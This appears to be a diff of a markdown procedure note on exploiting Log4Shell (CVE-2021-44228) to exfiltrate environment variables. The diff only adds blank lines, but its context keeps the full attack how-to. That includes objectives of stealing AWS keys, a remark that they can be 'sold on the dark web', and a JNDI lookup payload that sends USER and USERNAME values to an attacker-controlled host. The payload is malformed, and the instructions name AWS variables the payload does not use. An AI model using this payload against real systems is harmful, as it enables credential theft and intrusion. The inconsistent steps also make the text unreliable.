@@ -34,6 +34,8 @@ Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to e
 
 Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to execute arbitrary code remotely. This specific procedure focuses on exfiltrating environment variables through exploiting the vulnerability. By sending a specially crafted JNDI request, an attacker can access the environment variables of the targeted system and exfiltrate them to a remote server controlled by the attacker. This can provide valuable information such as AWS access keys or other sensitive information stored in environment variables. The technical explanation involves sending a JNDI request to the targeted system and retrieving the environment variables. The business value is that this can provide an attacker with sensitive information that can be used for further attacks or sold on the dark web.
 
+ 
+
 ## Requirements
 
 1. Access to a system with the Log4Shell vulnerability
@@ -41,6 +43,8 @@ Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to e
 1. Ability to send JNDI requests to the targeted system
 
 1. Access to a remote server controlled by the attacker to exfiltrate the environment variables
+
+ 
 
 ## Defense
 
@@ -50,11 +54,15 @@ Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to e
 
 1. Monitor network traffic for any suspicious JNDI requests
 
+ 
+
 ## Objectives
 
 1. Exfiltrate environment variables from a targeted system
 
 1. Obtain sensitive information such as AWS access keys
+
+ 
 
 # Instructions
 
@@ -63,7 +71,13 @@ Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to e
 3. Replace 'AWS_ACCESS_KEY_ID' and 'AWS_SECRET_ACCESS_KEY' with the environment variables you want to exfiltrate.
 4. Run the command.
 
+ 
+
+
+
 **Code**: [[${jndi:ldap://${env:USER}.${env:USERNAME}.attacker]]
+
+
 
 > This command sends a JNDI request to the targeted system and retrieves the environment variables specified in the command. The environment variables are then exfiltrated to the attacker-controlled server.
 
@@ -90,3 +104,5 @@ Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to e
 - [[CVE-2021-44228 Log4Shell]]
 - [[Environment variables exfiltration]]
 - [[Exploitation]]
+
+
